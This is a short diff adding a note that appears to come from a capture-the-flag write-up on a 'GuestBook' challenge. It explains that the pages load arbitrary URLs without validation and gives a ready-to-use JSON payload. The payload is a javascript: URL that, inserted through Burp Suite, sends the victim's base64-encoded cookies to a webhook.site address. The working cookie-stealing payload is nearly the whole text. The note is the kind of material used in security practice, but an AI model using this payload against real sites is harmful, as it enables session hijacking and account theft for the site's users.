@@ -1,0 +1,2 @@
+GuestBook ->   every challenge can be solved using the magic string of suffre insert this in the request intercepted using burp suite. This will redirect the cookie to our web hookpage. The problem is that all pages read an arbitrary url without checking anything: {"url": "javascript:fetch('https://webhook.site/3056ed01-9288-4df2-8d98-1f21d274a20a?cookie='+btoa(document.cookie))"}
+
